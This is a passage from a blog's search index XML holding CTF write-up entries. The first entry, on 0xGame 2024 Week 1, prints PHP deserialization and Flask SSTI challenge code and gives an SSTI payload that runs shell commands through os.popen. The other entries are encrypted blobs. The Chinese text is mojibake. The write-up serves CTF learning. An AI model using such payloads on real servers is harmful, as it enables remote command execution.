<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>20240xGame</title>
      <link href="/2024/10/06/20240xGame/"/>
      <url>/2024/10/06/20240xGame/</url>
      
        <content type="html"><![CDATA[<h3 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h3><h4 id="ez-unser"><a href="#ez-unser" class="headerlink" title="ez_unser"></a>ez_unser</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Man</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"ÂéüÁ•ûÔºåÂêØÂä®"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">str_split</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//ÊääÂ≠óÁ¨¶‰∏≤ÂàÜÂâ≤Âà∞Êï∞ÁªÑ‰∏≠„ÄÇ</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">What</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$Kun</span><span class="token operator">=</span><span class="token string double-quoted-string">"‰∏§Âπ¥Âçä"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Kun</span><span class="token operator">-></span><span class="token property">hobby</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Ok"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Can</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$Hobby</span><span class="token operator">=</span><span class="token string double-quoted-string">"Âî±Ë∑≥rapÁØÆÁêÉ"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Hobby</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">I</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"Kobe"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">-></span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Say</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evil</span><span class="token operator">-></span><span class="token function">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Mamba</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".log"</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Out</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./"</span><span class="token operator">.</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Á¨¨‰∫î‰∫∫Ê†º"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"o"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">,</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><h4 id="ez-ssti"><a href="#ez-ssti" class="headerlink" title="ez_ssti"></a>ez_ssti</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>flag<span class="token operator">=</span>os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>unsetenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>root_url<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"&lt;h1>The Url &#123;&#125; You Requested Can Not Found&lt;/h1>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://47.76.152.109:60082/<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum.__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span>.popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>GetShell‰∫ÜÊ≤°ÊâæÂà∞flag  ÂæàÊñ∞È¢ñÁöÑËÄÉÊ≥ï Ê≤°Ê≥ïÁî®fenjingÂëΩ‰ª§Ë°å‰∫Ü <del>ÂèØ‰ª•‰Ωú‰∏∫pythonÂ∫ì‰ΩøÁî®Ôºü</del></p><pre class="language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span>os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>unsetenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span></code></pre><p>ËØªÂà∞pythonÂêé unset‰∫Ü</p><pre class="language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">"aa"</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Â∞ùËØï‰∫ÜËøô‰∏™ ‰∏çËøáÊ≤°Âï•Áî®üò≠</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024CNSS Recruit</title>
      <link href="/2024/10/06/2024CNSS_Recruit/"/>
      <url>/2024/10/06/2024CNSS_Recruit/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9571d6a830a6f71efdb662809cbd809d4fcb7e10fc4297d19251df6cfd5e63cf">39f0446796239c1d1cfa8feb8f605b3bb5fa53736716a21850703403cadc59c5410aba2e6f9550a3168456b4f81ec0a5af1bf6bb52c184307cc5a218e02753705bf0facdb2a8c59613a597bfc373ee47f5aa7fa6918f87135fbed9deb56d731d6733a3d75f7d51af8159559211375e34c363390f037166a54df3d55eb80ff5a51add1cc1fb72246b072ec6981035e68b622b3d821253773bf3d111448f060496d10e1f471a3a14a41fd22b0f8aa5e6f219ad01d0a4cc6a7e43ca9589c7f55d00d7f0b2dd83f9e98b120eb8a2de2b25c5a77eb3c065e53fa2df7e9052225d8225ad04e9174d3dbabdae5c88c300c8e89a027a65a0b700a2b9d76805eefdfd4e32e9d18a9345941efc6ad9d183db67938c4117d10a0110ef9d9c25af524dd37ab4adf38cc5c718c6e5288a50f5d6f139b8886706d666bd2cb6df8378d728df44b229495dae7ab3ebad8dce8cb615d0299a060e9000bb35038611d2f40e1adc4f20ec014f8c0d2d75dca83bda60630e96ca1bdfc22eb76fe9de0b8fa465ad62aec2cb7e4a3c6e21c4387b0472f5273bb3384de87bab759c6e31a9d14f39fb93bb9cbbd8fec6243c23b2bbb69ca7406691ec6ae344848df61b8a4d2a1e7ae0bb9abc443f72722aff1851084acf3186c34bc867406b6fcaa27d121a9ecd9fd018709175287c065a4bade53664eed261a40b849576ce3582d4f778ea69fad6d17389bf6a3dfaa7758b90ee2e5cb25df2bd42b21350ebd685dbf24194301adf79c1d4dc31a0690ce12f093dfeeda266ca4f9f65df020aecdba1590ff64a216d8c14cc5b980d66150e6436b842c00c64f145ee035aae16e480b5dde65540907c9c9632d8c4870c60c7f58eec4a01a2c3cde39b451b22b4da72cf8db70cbd7778db48191262b62d7109f3f21534e38bb30704a60e4254c72433cf1d0a9c4b072348757b93ade0c04c4619beea7740caf262be52087bf485ca0701ccef0a8cae0fc16983bef71a4936c04c8b8e5cb4c0f606fdf6df427a8ac9a00942cb08c16dc002eda10817011859488b8cb025cca5098481e09530c639a04a9e6bd6d9b4700d4a4955092c89df849f66f3437dc05356c20a26dc434f047b820fc6f7412a4e9a5b57ad1e1f7ff39453fe688f5e3a7ed7da1753d02875cd91332ec4b4d2ab216a5b3f8e562349412f805e8027856c372dc9c45f8fc1dd4110f6f9cc2996d27ed91eb570bc852218a4f19e94d659fc78018886b799b6b1b7438ee26238fed84f2b6541f62234b3073cd050bd4ee38bb2e91c4ee3f90ecca908ce432805c9345260ddbdb31a2e2108afbe8b4ef5182673fc0be91aa8b4ea4fb8c3a457b6ea68c399d47d96979ca7823e18bbb5433fade2611b663b39dfd282d58738ff08d6a95ddcc4d581e35e9afafd01a8087fa1a93a953779871cc8125080c45c9073adb769c6235647b26f6cffac2ad43177a0dc5c385a08191e0ae7d359d32dc85b1d95a7a961220fe619502bc7bedf1305a5ca649f558b6a71a93f174d5a922d90a4b90330c4f6af2f68a751653de92e1c37553817558c8a4b2bb9f0cdd31bccddb2986322d1170849d80ccf7658a07c6a6e6e2503f3137cb48bd9ac9cdc604193507d259de3c6dba90cfbfc0cffca6fe2f553562469e1573549ef36b14c8c589371d223a97903835dfeebb5e10695619177fad375679795432a58b8fde28cf8e77c879c3f3258655088aa21b3ade7f503cd98821e532285db8fd63dbb5aee58aeb18e4a0afeedfd9c647bffb955d0c215b060da9712a238040194df6338fec936b0207f0bf10e33b89188c5a86b95ced814cfd581f0deeb6b4fb831fc63213c35d3c2b09d7ea770dbcd4c997f2f9ccdaf546b1684415123bff34dad66b6ca4817c5e04497ef3d01a360382310ca7b3a5ccddad4a24266a5f0dbdf9105f4d49c7ac0b735b6d2e68bc19094b83ed72c570b2890c73970b97848a5b13f324f9b6b8d62c752733226ac42b03cbb455cda770882bb53b307ad0d0d278e15e0df7f7811f93d24952dcb384895a438b656960c5499c6c8f4d88e37feeaa9f1632048d689e84b2946dab928a2dbcbc0d63803df690cd5d41af75a69568c5e6fe931e4f7c11c1a342c8483a1aefad40211866ededa2aa75625d18658a1ef6e39c1db2c802f781c198d9d544d6d5b53990e86a520a458b3f1126059ff8e04ad6b3f4f122752a52317f23750346dd7363d17bc002ec3d60785cf407cd83ef778cc41834227cd15b60035a650fc495155e0784dc372bfc9d6c229e63c134b192ef99d3d738a34e97156aed1aa5d39b1004cd97b11fc128012e8e488b8d9573028e067edac7978671814360fb6f8e879cf027cf43c786d08f801e3bde7d0864dea4ffdc463e7b52959e1da808e96da281aa549a647237b8cfbe3d0e952529bb4f0fc364dbdcb9436cac30e957c9772f4016a4addf9c301b80184235ae036d7ff5b959398ef543c39bedf6d6dd4ab7878f0140bc6e41816c2327a9f9c37056e551e9a8bef3d1867e95be182e475512d377c983cb6c41064148eedaabafab3bdb543797c0ff1dcc474ff398075ec41df4ac6e47942cacf27c01934d0ee1f74695aee76b45333dbb03dfb6eed51204a480eaf1bdc9e13ed2499e82e961dff1ca05faf511b34982be58a5bf2dcfd043ac4ef38dbc6d4417f1d00c4f7c86a013224fbe5e93eb80483847d37c90bf93a6107dc82318c237aea709442698fe38e67c3a869ac34e46c92054d470c5b57adec2f104930bca10645b0321781d5704fcf670bcc707bceabbe5c3717d933de4cbf3303326c5003e551713dfa6e940b34c947142aacc6829734957893b3465bae7bc68feee2333a92489339efeaa9087c117360a513013a564209147041ef3afa8d9c3fd8e76677f3093b3687afaf3d0d4cd7bec1d090cf287a3e50768fe917be9dc434c436d1bbb4ee438c75f97092c53e973457030a3d2f7c3e5affbac140552431ff7e859d5ee96ffdd049d09e67e447134324c63281bd031aa67168a1cea5909ed6918fb30f8c7c66cd4701ae5b38e1f4a95a74a025b5412de02b8e8430e5b5cbe4c2490160ee0a4f38c8c20654bcba6071537e2e8bf83e15b0094aaf92a7cd30e1a963977e323423740878a10b2db6cf31b435d42bfe69d3ef91b4a46ad215e464d6dccc54eb3fd65ccfe64be04cf160a0031263f04ab1c8e7b39eb1dfc9add7f661cd90a7e0e86cd9bac447a0a582eef038075b274ff42dcc69b769c01957470b7f4c54e59e33c201b0909606902a7ac63512672684e4eae7dcb78c0fa4ff1982c584e9a4b224eb152fd8eeea1b68a741b6582c492a1bfa601668b03d091a4fb38556e057ce219663942c7ce4d5a920ae247b0799e9d5326ec293263a70399df43ee690f1cef526ff67b7abf120109a14fe3d6a8712c441b7ec6336797aa82ac85f8e6f6f60329bc03b18f5555f18f0920ec203bab47641f474644ef0d15f3116e4bdc8acf90c6d856667576ea5dd7e823bafae1c52732e251dfa310b6023cf475bcfdf53503b6bb06ec952602c90ec961ef9d77511044a41f57be20c04a15948da474996f00df99e0ca41d83aa4ac9fb1ed9dac829d9cab0fbc5c93e6bb7b0e2def2d814b693177b6aff96896bde681aaea391fffb06801b93264c84fa032b355bda36fa0cc06e531d805c26341e288a052923b04df0bc7ef7114e70fb19a60ed2d8018d57bf222d92a5055504c8ac03de4bdfe463609d36aaf456bf85cdcac4778d6cac1387bd21c3fecc094c78ea5cd3ce1da788aff87d0306887df39d7e0a90bb45b92684a5e72eb7b5b7ec524ea8fb3f2bb792a6ab8d375b0376ed31067d455e05ef2486f4f339ece7cabfac8574124a9ca4b1d02db24b5c9c6b7d1858c6df620dc34f167558c063aad669b1aa3e3b2d1d9500bbe8a10ea6933e105ba34c10eca2ee5049f42811788670a9d33d976c1d1aed996f5a94d8d3a615c26916446885225e687cdf587fd260e615127cf04f5e30c7126def80d7c14801ec3f4219a3439175906aafb54ea147c0f347e17635fbfa80eee87e8347a0b5175248ba341cb0031ba0523fc3a545599867b27bcec93156bbf90ae22b90f9c215321d9d9ed1ec1e4f933ff0c791d4995c85821a609545549fbe5558b147a4fafb2674f02a4e6b60167b03c38b20f3db853a2f2427ac2fd43ea21766cc38e53a19eb2adbfd290d7b9246c0c78d202b4bc9debad9a49f908c1e33bec6e085848dd05850143781b89a4e748f50cfd4de83536c395cddbb96d5926b0a6b2cbdb979df349cb4f5f75f46d639a24ee310a6a891ae4f2fc5d8cc1996752a65d99982b928277cc12b6635d4bbbda223c8c1e71b9ee335f8e4be0d241e1303d989acdc4556fc3bbbd814ef9d66a0b02fe12aafaf332aea1be976682e221c149878443d22b551154e1417303b981cff56f030dfa79fcb4ce06fb69a10d568496cea0370a16ec1aa6b1a1bbbdb539a90461297661362ef3a9514ecbf63cb429aa2610214d9e4b4a6f1883b47aa3c4b3681aac5d79ad3126933f25c6828bec6293accc1ee55a4652e5cd596f4beacb9fd68ed200e0f90391191eb827099d2502691d2914e15391a770b84dd9452dbb2dded88e32e2b817c184986d83cfd9a19a63c827eb9107eeb26e4b51fed09b2347daf17d03f23f27d7346a62a143a52b2977783d863749f9fd0e5140d87c86214e0db7ce8145521a0324bcfb9e40170832ee66e7c68c9784f49d4c713c91ef38a4882c06e35c31b8acb638a27306b5a1900c0fcb5ed33ce48e160d21dd2300b01b9ba7dc8625e45ad22c882cd008e5bb800c8a74c0b44e83484ccb695e141c3a5968272be909fc1b04b79a43d2e97a860bb7912bb5f3fdec42c2b6fd75428560ae98dd2940c682677d9d39c82a377dc4b336a654bcccaa5b5383fac303448b6c64de260234c2fd8c0fd29848d9cc6f0dc8f7bb9a6c176e37b18fe85fd0aaa541f9f5bd1668dda572ac77f1b0e0dd7dcfd414b26f198bd56899ff1612bfeecb4d2ecd0d1a1be5f7243a6ab6f7f61f369e2650be58a43da0f1385dab7f5ca85b34d6da5666a35d9cc33d43bbc5b1368116ac4268786993199deafafafecc8f0d074f8a91c13b92dd7da599de3c87c56105c471baaab58d50cbbb5ab60b6eb2a7f35c285b1998eb69948ac8f30b93f60542df20acbd81f2973109d731305581e8a313d633d1a627cf04943626432a5e591db5ebb7b25ece22401a5ae1c83c6be231b6c687ede49754ee1d66dea5620f75be7e2e9b026bab2b90a239b47fff6bc85777d120e0d585eff5812eeb68114af1d8d3418b7111f3832c493823da1cd5021f984319b1fc2f6f82c9b90bb7db802732d01211f069c236a6ff379846243493ccd365e778cdd9b117e67fd0ceb1344a6e5be77768d2854fcc47232b83c46f2dae62aa27f55f8cd7f1da167179effe09c6d559bd67db96e589ffbaf3666e6b1575cec16e2aea50fe2a1abf64713c68f4feacf038272e57dbb26e0d18576e0d1fccab200be3ca49829871076947855201490022ef03aecf3c624cf94e2dc6b70482efdbbe6e848d5017d70e32137cbf1a536a96ddc7e807365c129d5bdb297aa2411933661d75a37d3f572bfa476616c3ecdf7e48a52fbc94d9c7b6211d389f6a074f99520c013dc8aa6a22967145a806ad5dd075d71fc1f6d4bbf84c1473470de30b7ed198d99801a526f50b2feb392ba7b77a5d5ae65594da7b770c3115b950ead800b5aca080b89d0c56f0a23f28213c51fedea22120dd86541933007569e4103cc2240202fd5d3f6fc9c5ebb695386de11856ed37a85c0ade2afe54cb0b18da04c985ef03fa46fde0ffd5491ece3f75736054498ee9991370d4d4343bda22948cd83f05c84b9d2ea28f18672e0fae3be30a73c7dc5859af48fef750ed88ebfa1ddb8b298e5d4d223f8f16baf5bfbd6bceeeddd5ca4695d7c8fa7bc9bd9d4429c9f55506844996c8851b112b3a055159741f33c129d880b1a8575da210258e9eeb24e640252cae1da18f5c92c2dbdf6a418bcfc9bd2f24066f6f0c09c11a5be9c7cbe6d7bb6b8c03fe8891d5f37c827bad05dc34189d449211928908df4137fae34b5f93a049e7ca6c74b8df53cb0660a9420fc02a9169217badc1bb846433c681c36dc7bf4881aecade7e363652eff04a0f04c348089db6e6fe066c36e644bc8ceccb0629de34f1df7a4e74f55b788b76e02f1904ebb32712d882002cd71c62fd8ca8444596f0711c885b5bd606676cd90e67cf7abefe949c28918d07bb4ec8d6f55103bdec23cedc148cc36859e17e81585e6e07c2b48291e2cf2760ab098e9964ef6926d7ce37bcf4fc18cc475b4557c9472654cdc51a16a95e480a06c8cc35c4b76f81017548c5badd4cf71303974bb05cc80ca440089285e3db7ab6abcf7711588ed3e45d06d0fa153f110fe3ec2f933d370279935fe3b1b9586c39ce83551121886b78a7514f9fca11cf197ccd58aaf33e2bfdf5f3f22c661c3ba44ef74aad3b1b88fd3cd76d77ef59c220b76958979f122d904828367aee009f4bde769a68a61f03e8355b2ee5789998751fef5fd0382e95154c7a7c4030b0047caa6d56245e16eb51e9e4709b3c014a9e76d47d1141695399b989b7f8b2c97acd2c6073cfa8b31218dee10c26a56f3dc25568df2c1f25cb4b99f7178d616fc97e54227d8c8ace544c0e35691db4c7cd5f1114b2cf3515239c84ad942bb557c4eeb4fab4cb7508f1b98418522f3a3149954abac20fd7450261752121d5300a816e0c406f04e73aa2cfe0c8d6af196b979e67fa5a124da390c151b798ad0b379b6088c6858970239af1eafac61233e327b77232f16c1c9fa20b94c078ab702086cae2bb798c11f601ac709297f02582f6fc817b771d07534a115a967afe93d0b85e34803eecc27872ffd397d9a9cc9a871a92c7e9b2e94568909d005adde8126fd839090412d0310e4d663ef851e6a851f15e287ed4100721dd18dba327f83ad8e41316b6e84b400506ad64cde905b58f6d9b8a194094cfde6c39222ff6ae89de05f4b3368e8f602760d180575c2c2ee11c7c7b9d4df43b2a5009282f82d80c8c13b1f8f199d9c9764b5f30c07c061df00401a5f3aeae85e3d53f006baa9f74c00918d06b0c2c3ddea8928bdcde4a211d6bff2ceaafd3f0729e5224faf034fc738f12ee4561453ef273f9c897725b7a09083a5880c14918eaf030a8e4ba35f7498a82b883c1f2d39a0d63a6d5748b67a1f9607faa7690da7dea5209c704f1ca62845107e5e0ca52da68096c81463f2f97eb9a9c5a8320c853997d36d86d771a81f5d1ddfaceb2582551c2d3a939467f55fd954b9313d5a3c51d3f247ddd4e279a4eb3d8edfb18b81083bd3821090caa0e4e9871f315d36ddb9805bef7428dbfa12fe8bf912ad5db80664fdf34c6352ffabf8e9ac98b5239f7f58f7dde9ddd4776bca76b489c4d4fd9640283f18c00c0c2cce2be70e991f684e4265ba284a6b9be68c5333fabb4ffb6d338828ef07d9418838e5bc5af8a4cb8ccf32c7bbb13522014aef3c5624aaa603c77ba25b5c6a287c26c24b51794d2e3bcb989bfcbde4921987905e37dbd67616554abb608ea71089b13e297c4fd103465aedb49b03c75f105813b22b00648eaaec7c093c3572f5ab1f93b80b0949366d720ef683a3543f654d9a30f34f57aa57cf664cf34bc469e39511076a76f40b7fe2e600397e364d96c21f2928d53c75bdbc051bc5601d9fc9bd39a67cf3d6636fd76ffc44e1c8b99b5de259e514ae56c09367d04e38382da7cb44f6425ec7d4b29680c08900e5a346b6f7a4d15fff87e538594faad946af25e473ed92c86683404589c0af8d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNSS Recruit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024SHCTF-web</title>
      <link href="/2024/10/02/2024SHCTF-web/"/>
      <url>/2024/10/02/2024SHCTF-web/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="524d0cdbbd2d2466b6ca63d138973ff162425119d3413f368192b7d21307d5d2">49128ed7c8de50dece0b3e74053d97544abb8ad726602f0cfeef9b94a8e0188c064f7783adb497e1f9b3df007c052d96616f97d2d6371ec1279e1032f2e5615f2a8422a646c632e80e407bd938a600799240ae94372483808451b3543b013fb3e9ffe544e6f24d0fbadab20b42ad5d96206965d8ff5dbd526ad54436b6a5b60baaaa979970b62dc89b5aa4d321ae26396e2013303b22803368bca38a7748c6080786bac986b3a8f8ae8067af811e6011b66dc7bbe3158643968785d2dacbcb6e2a2363d43467bced1863a4fda6ccb72c010e3b5c6ba2c46ee4f417fa8a9e93caa1d26f74afe0ac06244d8e6b7be09c7a7380db2a8ff25fd84411f3b6bcf4213815e93adf58e3b88e70fe09b07048022321a52aae1a37c32a113bba2a67a31557ed37aa64407e1705413d4642dece1891a378415d4466eaaf161d7f382f42252c19c9eee95aba531cd3dd2229a032acdb5196c65f98bb10b381772fa73c7eca53c6f51ef2d06cad60d0b62a1243ff7c01923501d690f08a71a1ed3da01ffcb869b5e6bf065a7d18b6753bb46ed7875747526228dcd7bc130566879d7823df82c793529f4adef7ccbb90464acc394caaee1235fc955a64f0fae0e00301634b37d7b0ad149caec06a9e7346a8c0a0893db6cbda0cc14accafe79217dbb61a9e15b791a19c47e325b8892c383a80cc814c93cca76e4433a0edcd3c2644245c721a57f18c19b5613e71a64440417cc28e418ac1033230b49d1299a67eae31562fc95f29398507f8a0d57b2ddede3e2915056ba8d8bb4cbe2bc7498a59409c5bd7258624f099717a9c4feba984875c383a4dd56da9c9a19a7473cd1ed64f13f20b803c482ef3dbb39d851c2cdedef0deb89599fe891cdbebb1cd226b2b0fc0ba7571413e1395b94ab4025f36f35ae0df5075d8116978e77e5089c92f226986a0764215b956c4448959fc629084f06d852c15a29590e2cdc1b19b905ebd136dcf8d7898b5d93cf6a48e801a9ec395d93a392d093a660d1af71a073bf542938da984762b19e1829d42c86391b987f18bf47095a9b4270674a43feebd712bdc6fc0a1a125fe4090ee77338d704f59cdf788612dfb99b261b12f571529960a23594e1917c42446d4ec5bf413f5fea99753fabdc57443d1b11a6d25605ca9ecbd2691ad82f4e9ca53de124309b469e8a96b34b1de017f38bd91a347c0868cb01728fb36c860bad2550532eedb38dcc3fe7f13cdcb9fd0520ad3774e4206010a8cc0fe48367351d3109be32f2f833106c77ca840eb6bcc85c1ca2f24c7cf11259ce9f1444acbc503437bbd7f49e1160181f4578b093b8c44fa65520ddf596ba29209afe2de9947f411839f016af36de8839b548daf49df55cecf3c1f6932587f65f08797ab5da8328165edcb36faee42a98f2a086a0e9637057cf84fcba1cf3283327fa9759218a7515979bc6d420df64c5e6491e85d0e2dac2fe695e36bec19023c66677735844afc3dba7bcc102dff53a272efeab88880906d90f9bd171d32c